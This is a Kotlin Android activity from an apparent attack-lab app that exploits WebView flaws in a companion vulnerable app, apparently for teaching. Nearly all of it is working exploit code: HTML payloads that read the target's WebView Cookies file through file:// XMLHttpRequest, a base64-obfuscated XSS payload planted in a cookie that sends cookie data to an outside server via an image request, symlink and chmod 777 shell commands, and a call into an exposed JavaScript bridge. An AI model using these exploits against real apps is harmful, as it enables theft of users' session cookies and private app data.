package com.forgo7ten.attackapp.attack.webview

import android.content.Intent
import android.os.Bundle
import android.util.Base64
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.net.toUri
import com.forgo7ten.attackapp.ConstValue
import com.forgo7ten.attackapp.databinding.ActivityWebviewAttackBinding
import java.io.File

class WebviewAttackActivity : AppCompatActivity() {
    companion object {
        private const val TAG = "WebviewAttackActivity"
    }

    private lateinit var binding: ActivityWebviewAttackBinding

    private lateinit var htmlFile: File
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityWebviewAttackBinding.inflate(layoutInflater).apply {
            setContentView(root)
        }
        htmlFile = File(dataDir, "evil.html")
        Log.d(TAG, "onCreate: htmlFile=${htmlFile.absolutePath}")
        binding.btnAppcloneAttack.setOnClickListener {
            appcloneAttack()
        }
        binding.btnContaminatedCookieAttack.setOnClickListener {
            contaminatedCookieAttack()
        }
        binding.btnJs2nativeAttack.setOnClickListener {
            js2nativeAttack()
        }
    }

    private fun js2nativeAttack() {
        createJs2nativeHtml()
        sendEvilIntent("js2native")
    }

    private fun createJs2nativeHtml() {
        val js2nativeHtml = """
            <!DOCTYPE html>
            <html lang="en">
                <head>
                    <meta charset="UTF-8" />
                    <title>js2native</title>
                </head>
                <body>
                    <h1>js2native</h1>
                </body>
                <script type="text/javascript">
                    console.log("js2native")
                    var flag = "js2native,flag: "+info.getFlag()
                    console.log(flag)
                    document.body.appendChild(document.createTextNode(flag));
                    alert(flag)
                </script>
            </html>
            
        """.trimIndent()
        if (htmlFile.exists()) {
            htmlFile.delete()
        }
        htmlFile.createNewFile()
        htmlFile.writeText(js2nativeHtml)

        exec("chmod -R 777 ${htmlFile.parent}")
    }

    private fun contaminatedCookieAttack() {
        // 创建恶意的html文件
        createContaminatedCookieHtml()
        // 启动vulnerableapp，让其加载网页中的js
        sendEvilIntent("contaminatedCookie")
        Thread.sleep(3000)
        createSymlink()
    }

    private fun createSymlink() {
        val cookiesPath = packageManager.getApplicationInfo(
            "com.forgo7ten.vulnerableapp",
            0
        ).dataDir + "/app_webview/Cookies"
        Log.d(TAG, "symlink: cookiesPath=$cookiesPath")
        // 创建符号链接
        symlink(File(cookiesPath), File(dataDir, "symlink.html"))
    }

    private fun createContaminatedCookieHtml() {
        // 这里用到了服务器，来获取cookie信息，无所谓的，也可以用log打印看效果
        val evilJs = """
            var baseUrl = "http://${ConstValue.serverBase}/contaminatedCookieAttack/info?"
            var cookieData = encodeURIComponent(document.getElementsByTagName("html")[0].innerHTML)
            new Image().src = baseUrl + "cookie=" + cookieData;
            console.log("cookieData=" + cookieData)
        """.trimIndent()
        val base64Eviljs = Base64.encodeToString(evilJs.toByteArray(), Base64.NO_WRAP)
        val evilHtml = """
            <!DOCTYPE html>
            <html lang="en">
                <head>
                    <meta charset="UTF-8" />
                    <title>evil</title>
                </head>
                <body>
                    <h1>injected cookie with xss</h1>
                    <script>
                        document.cookie = "sendData = '<img src=\"evil\" onerror=\"eval(atob('${base64Eviljs}'))\">'";
                        setTimeout(function () {
                            console.log("location.href 跳转")
                            location.href = "file://${File(dataDir, "symlink.html").absolutePath}";
                        }, 40000);
                    </script>
                </body>
            </html>
        """.trimIndent()
        if (htmlFile.exists()) {
            htmlFile.delete()
        }
        htmlFile.createNewFile()
        htmlFile.writeText(evilHtml)

        exec("chmod -R 777 ${htmlFile.parent}")
    }

    private fun appcloneAttack() {
        // 创建恶意的html文件
        createAppcloneHtml()
        // 启动vulnerableapp，让其加载网页中的js
        sendEvilIntent("appclone")
    }

    private fun createAppcloneHtml() {
        val appclone_html = """
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>Steal Cookie</title>
    </head>
    <body>
        <h1>Steal Cookie</h1>
    </body>
    <script type="text/javascript">
        function stealFile() {
            console.log("stealFile()");
            var file = "file:///data/user/0/com.forgo7ten.vulnerableapp/app_webview/Cookies";
            var xmlHttpReq = new XMLHttpRequest();
            xmlHttpReq.onreadystatechange = function () {
                if (xmlHttpReq.readyState == 4) {
                    var text = xmlHttpReq.responseText;
                    console.log(xmlHttpReq.responseText);
                    alert(text);
                    // 创建一个新的 h1 元素
                    var newHeading = document.createElement("h2");
                    newHeading.textContent = "读取到的内容如下：";
                    // 将新的 h1 元素添加到 document 的末尾
                    document.body.appendChild(newHeading);
                    document.body.appendChild(document.createTextNode(text));
                    // 可以通过javascript，在这里对获取的信息做任意的操作
                }
            };
            xmlHttpReq.open("GET", file);
            xmlHttpReq.send(null);
        }
        setTimeout(stealFile, 500);
    </script>
</html>
    """.trimIndent()
        if (htmlFile.exists()) {
            htmlFile.delete()
        }
        htmlFile.createNewFile()
        htmlFile.writeText(appclone_html)

        exec("chmod -R 777 ${htmlFile.parent}")
    }

    private fun sendEvilIntent(path: String) {
        val uriStr =
            "fvulnerable://forgo7ten.github.io/webview_vulnerability/$path?url=file://${htmlFile.absolutePath}"
        Log.d(TAG, "sendEvilIntent: uriStr=$uriStr")
        Intent().apply {
            action = Intent.ACTION_VIEW
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
            data = uriStr.toUri()
            startActivity(this)
        }
    }


    /**
     * 创建软链接
     * @param targetFile 目标文件
     * @param linkFile 软链接
     */
    fun symlink(targetFile: File, linkFile: File) {
        exec("rm $linkFile")
        exec("ln -s $targetFile $linkFile")
        exec("chmod 777 $linkFile")
    }

    fun exec(cmd: String) {
        val result = Runtime.getRuntime().exec(cmd).waitFor()
        Log.d(TAG, "exec: cmd=$cmd result:$result")
    }
}